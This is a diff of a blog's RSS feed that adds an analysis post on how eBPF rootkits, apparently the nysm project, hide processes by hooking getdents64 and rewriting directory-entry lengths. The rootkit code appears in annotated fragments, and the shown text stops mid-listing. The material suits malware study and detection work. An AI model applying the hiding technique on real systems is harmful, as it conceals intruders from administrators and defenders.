@@ -6,8 +6,239 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 26 Apr 2025 10:45:47 +0800</lastBuildDate>
+        <lastBuildDate>Fri, 09 May 2025 08:16:42 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>eBPF Malware Techniques Part 4 - Hiding Processes</title>
+            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/</link>
+            <pubDate>Fri, 09 May 2025 08:16:42 +0800</pubDate>
+            
+            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;In this post, we explore techniques employed by eBPF to hide processes. When I wrote my first rootkit that hides targeted directories, my go-to reference was this well-written &lt;a href=&#34;https://xcellerator.github.io/posts/linux_rootkits_06/&#34;&gt;blog post&lt;/a&gt; by &lt;a href=&#34;https://github.com/xcellerator&#34;&gt;TheXcellerator&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;As PIDs are tracked under &lt;em&gt;/proc&lt;/em&gt; as a directory, there&amp;rsquo;s no need to re-invent the wheel when it comes to hiding processes. That’s because Linux veterans know that directory listings are handled by the getdents64 syscall — a well-known technique.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>In this post, we explore techniques employed by eBPF to hide processes. When I wrote my first rootkit that hides targeted directories, my go-to reference was this well-written <a href="https://xcellerator.github.io/posts/linux_rootkits_06/">blog post</a> by <a href="https://github.com/xcellerator">TheXcellerator</a>.</p>
+<p>As PIDs are tracked under <em>/proc</em> as a directory, there&rsquo;s no need to re-invent the wheel when it comes to hiding processes. That’s because Linux veterans know that directory listings are handled by the getdents64 syscall — a well-known technique.</p>
+<p>However, if you are still relatively new to Linux&rsquo;s internals, the next section will provide clarity on how the <em>getdents64</em> syscall works.</p>
+<h2 id="2-what-is-getdents64-syscall">2. What is getdents64 Syscall?</h2>
+<p>You can reliably learn about this syscall from its man page (<code>man getdents64</code>). In addition, we can also search up the function definition in the Linux kernel source code <a href="">here</a> to see its parameters.</p>
+<p>Essentially, the function prototype of <em>getdents64()</em> looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getdents64</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirp, <span style="color:#66d9ef">int</span> count)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Prototype of <em>getdents64()</em><br><br></span>
+<p>This function takes in 3 parameters:</p>
+<ol>
+<li><code>int fd</code>: The file descriptor of the directory to read.</li>
+<li><code>struct linux_dirent64 *dirp</code>: A pointer to a buffer where the directory entries will be stored.</li>
+<li><code>int count</code>: The size of the buffer in bytes.</li>
+</ol>
+<p>And it returns the number of bytes read into the buffer, or -1 on error.</p>
+<p>To dive slightly deeper, let&rsquo;s break down <code>struct linux_dirent64</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> linux_dirent64 {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ino64_t</span>        d_ino;    <span style="color:#75715e">// Inode number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">off64_t</span>        d_off;    <span style="color:#75715e">// Offset to the next dirent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen; <span style="color:#75715e">// Length of this record
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;   <span style="color:#75715e">// File type (e.g., DT_DIR, DT_REG)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span>           d_name[]; <span style="color:#75715e">// Null-terminated filename
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Definition of <em>linux_dirent64</em> Structure<br><br></span>
+<p>This structure represents a single directory entry and has 5 members in the structure:</p>
+<ol>
+<li><code>ino64_t d_ino</code>: The inode number of the file.</li>
+<li><code>off64_t d_off</code>: The offset to the next directory entry.</li>
+<li><code>unsigned short d_reclen</code>: The total size of this directory entry, including the d_name field.</li>
+<li><code>unsigned char d_type</code>: The type of the file (e.g., directory, regular file, symbolic link).</li>
+<li><code>char d_name[]</code>: The name of the file (null-terminated string).</li>
+</ol>
+<p>To tie everything together, what happens is that when <em>getdents64()</em> is called, it fills the provided buffer (<em>dirp</em>) with a series of <code>struct linux_dirent64</code> entries. Each entry corresponds to a file or subdirectory and has a variable size, determined by the lengths of the <em>d_name</em> and <em>d_reclen</em> fields. The kernel then iterates through the buffer using the <em>d_reclen</em> field to locate the next directory entry.</p>
+<p>Here&rsquo;s a simple example of using the getdents64 syscall to iterate through your files and subdirectories in the current working directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUF_SIZE 1024
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> linux_dirent64 {
+</span></span><span style="display:flex;"><span>  __ino64_t        d_ino;    <span style="color:#75715e">// Inode number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __off64_t        d_off;    <span style="color:#75715e">// Offset to the next dirent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen;   <span style="color:#75715e">// Length of this record
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;     <span style="color:#75715e">// File type (e.g., DT_DIR, DT_REG)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span>           d_name[];   <span style="color:#75715e">// Null-terminated filename
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;.&#34;</span>, O_RDONLY <span style="color:#f92672">|</span> O_DIRECTORY);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUF_SIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> nread;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((nread <span style="color:#f92672">=</span> <span style="color:#a6e22e">syscall</span>(SYS_getdents64, fd, buf, BUF_SIZE)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>d;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> bpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; bpos <span style="color:#f92672">&lt;</span> nread; bpos <span style="color:#f92672">+=</span> d<span style="color:#f92672">-&gt;</span>d_reclen) {
+</span></span><span style="display:flex;"><span>          d <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(buf <span style="color:#f92672">+</span> bpos);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name: %s, Inode: %llu, Type: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>d_name, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)d<span style="color:#f92672">-&gt;</span>d_ino, d<span style="color:#f92672">-&gt;</span>d_type);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (nread <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;getdents64&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Simple Example of Iterating Files/Directories in CWD - <em>simple_ls_cwd.c</em><br><br></span>
+<h2 id="3-methodology-on-hiding-processes">3. Methodology on Hiding Processes</h2>
+<p>Now that we better understand how to iterate through directory entries, we can basically do the following high-level steps to hide our processes:</p>
+<ol>
+<li>For each directory entry, check if the PID is our target</li>
+<li>If it is, then update the previous directory entry&rsquo;s <em>d_reclen</em> to skip over the current directory entry</li>
+</ol>
+<p>The pseudocode below reiterates the concept:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(d_name)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> target_pid) {
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  previous_d_reclen <span style="color:#f92672">+=</span> current_d_reclen
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Pseudocode For Hiding Target PID<br><br></span>
+<h2 id="4-github-project---eeriedusknysm">4. Github Project - eeriedusk/nysm</h2>
+<p>The <em>nysm</em> project uses eBPF to hide specific PIDs from directory listings. This involves a combination of hooks and user-space logic to track, manage, and hide PIDs.</p>
+<h3 id="41-tracking-pids-to-hide">4.1 Tracking PIDs to Hide</h3>
+<p>The first step is to track the PIDs that need to be hidden. This is achieved through the <em>kretprobe</em> hook on <em>alloc_pid()</em>, which is triggered when a new PID is allocated.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kretprobe/alloc_pid&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KRETPROBE</span>(alloc_pid_exit, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret_pid) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> upid numbers <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">!=</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>numbers, <span style="color:#66d9ef">sizeof</span>(numbers), ret_pid<span style="color:#f92672">+</span><span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> pid, numbers));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr, <span style="color:#f92672">&amp;</span>numbers.nr, BPF_ANY);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Kretprobe</em> Hook on <em>alloc_pid()</em><br><br></span>
+<p>According to the listing above, <em>nysm</em> only keeps track of processes that are from the same namespace. It then proceeds to update <em>map_alloc_pid_pid_data</em> only with its own PID and children process PIDs.</p>
+<h3 id="42-cleaning-up-tracked-pids">4.2 Cleaning Up Tracked PIDs</h3>
+<p>When a process exits, its PID is no longer valid and should be removed from the tracking map. This is handled by the <em>kprobe</em> hook on <em>free_pid()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kprobe/free_pid&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KPROBE</span>(free_pid, <span style="color:#66d9ef">struct</span> pid <span style="color:#f92672">*</span>pid) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> upid numbers <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">!=</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>numbers, <span style="color:#66d9ef">sizeof</span>(numbers), pid<span style="color:#f92672">-&gt;</span>numbers);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">bpf_map_lookup_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_delete_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Kprobe</em> Hook on <em>free_pid()</em><br><br></span>
+<p>Again, <em>nysm</em> only monitors processes from the same namespace. It does a map lookup for the PID being released. If this PID exists in <em>map_alloc_pid_pid_data</em>, then it is deleted from the map.</p>
+<h3 id="43-storing-directory-entries">4.3 Storing Directory Entries</h3>
+<p>Now that <em>nysm</em> has a way to keep track and remove the PIDs to hide, the next step is to use a <em>tracepoint</em> hook on <em>sys_enter_getdents64</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tracepoint/syscalls/sys_enter_getdents64&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_getdents64_enter</span>(<span style="color:#66d9ef">struct</span> enter_getdents64_format <span style="color:#f92672">*</span>ctx) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>dirent;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> tgid <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_get_current_pid_tgid</span>() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#f92672">&amp;</span>map_getdents64_pid, <span style="color:#f92672">&amp;</span>tgid, <span style="color:#f92672">&amp;</span>dirent, BPF_ANY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracepoint</em> Hook on <em>sys_enter_getdents64</em><br><br></span>
+<p>When a process that triggers this hook does not belong to the same namespace as <em>nysm</em>, the program stores the directory entry buffer pointer in the <em>map_getdents64_pid</em> map, associating it with the process’s tgid. This allows the buffer to be accessed later at the <em>tracepoint</em> for <em>sys_exit_getdents64</em>.</p>
+<h3 id="44-processing-directory-entries">4.4 Processing Directory Entries</h3>
+<p>Now that the relevant directory entries are stored in the map, processing is needed via a <em>tracepoint</em> hook on <em>sys_exit_getdents64</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define DIRENT_BPF_LOOP 128
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tracepoint/syscalls/sys_exit_getdents64&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_getdents64_exit</span>(<span style="color:#66d9ef">struct</span> exit_format <span style="color:#f92672">*</span>ctx) {
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_read_elem</span>(<span style="color:#f92672">&amp;</span>dirent_ptr, <span style="color:#66d9ef">sizeof</span>(dirent_ptr), <span style="color:#f92672">&amp;</span>map_getdents64_pid, tgid)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> DIRENT_BPF_LOOP; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>dirent, <span style="color:#66d9ef">sizeof</span>(dirent), dirent_ptr <span style="color:#f92672">+</span> data.offset);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>d_name, <span style="color:#66d9ef">sizeof</span>(d_name), ((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr <span style="color:#f92672">+</span> data.offset))<span style="color:#f92672">-&gt;</span>d_name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>d_type, <span style="color:#66d9ef">sizeof</span>(d_type), <span style="color:#f92672">&amp;</span>((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr <span style="color:#f92672">+</span> data.offset))<span style="color:#f92672">-&gt;</span>d_type);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Trucated Code - Refer to Section 4.5 */</span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    data.old_offset <span style="color:#f92672">=</span> data.offset;
+</span></span><span style="display:flex;"><span>    data.offset <span style="color:#f92672">+=</span> dirent.d_reclen;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (data.offset <span style="color:#f92672">&lt;</span> ret) <span style="color:#a6e22e">bpf_tail_call</span>(ctx, <span style="color:#f92672">&amp;</span>map_getdents64_recursive_tail_call, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracepoint</em> Hook on <em>sys_exit_getdents64</em><br><br></span>
+<p>The snippet above shows that this hook iterates through and processes directory entries 128 times before doing a tail call back to the start of this <em>tracepoint</em>. This limitation exists because eBPF programs can only execute a limited number of instructions per invocation. By limiting the loop to 128 iterations, the program ensures it stays within these constraints while processing large directory buffers. The tail call mechanism allows the program to continue processing the remaining entries in subsequent invocations.</p>
+<p>The configuration for the tail call is handled in <em>nysm.c</em>, where the <em>tracepoint_getdents64_exit()</em> program is added to the <em>map_getdents64_recursive_tail_call</em> hash map using a key value of 1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> prog <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_program__fd</span>(nysm<span style="color:#f92672">-&gt;</span>progs.tracepoint_getdents64_exit);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_getdents64_recursive_tail_call), <span style="color:#f92672">&amp;</span>index, <span style="color:#f92672">&amp;</span>prog, BPF_ANY);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">goto</span> cleanup;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Configuring Tail Call in <em>nysm.c</em><br><br></span>
+<h3 id="45-hiding-tracked-pids">4.5 Hiding Tracked PIDs</h3>
+<p>Continuing our analysis from the truncated portion in Listing 8, the directory entry name is first converted to an integer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(d_name);
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Directory Entry Name String to Integer Conversion<br><br></span>
+<p>Then it checks whether the PID exists in the <em>map_alloc_pid_pid_data</em> hash map, where it previously stored a set of PIDs that needs to be hidden. (Recall Section 4.1)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_lookup_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>pid)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Truncated Code - See Listing 12*/</span>
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Check If PID Needs To Be Hidden<br><br></span>
+<p>If this is the first hidden entry encountered (<code>data.d_reclen == 0</code>), the program calculates a <em>d_reclen</em> for the previous entry by adding the size of the current entry (<em>dirent.d_reclen</em>) to the gap between the current and previous entries (<em>data.offset - data.old_offset</em>). Then, it stores the offset of the previous entry in <em>data.change_me</em>.</p>
+<p>Otherwise, for subsequent consecutive entries to be hidden, the program accumulates their sizes in <em>data.d_reclen</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>data.d_reclen) {
+</span></span><span style="display:flex;"><span>    data.d_reclen  <span style="color:#f92672">=</span> (data.offset<span style="color:#f92672">-</span>data.old_offset)<span style="color:#f92672">+</span>dirent.d_reclen;
+</span></span><span style="display:flex;"><span>    data.change_me <span style="color:#f92672">=</span> data.old_offset;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    data.d_reclen <span style="color:#f92672">+=</span> dirent.d_reclen;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Calculating <em>data.d_reclen</em> If Directory Entry Needs To Be Hidden<br><br></span>
+<p>At the other branching statement of Listing 11 when it encounters a non-tracked PID, it checks if there are hidden entries (<code>data.d_reclen &gt; 0</code>) and if the program has stored the offset of the previous entry (<em>data.change_me</em>), it writes the updated <em>d_reclen</em> value to the previous entry in the directory entries buffer. This ultimately causes hidden entries to be skipped when the directory entries buffer is processed by user-space programs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (data.d_reclen <span style="color:#f92672">&amp;&amp;</span> data.change_me <span style="color:#f92672">&amp;&amp;</span> d_type <span style="color:#f92672">==</span> DT_DIR) {
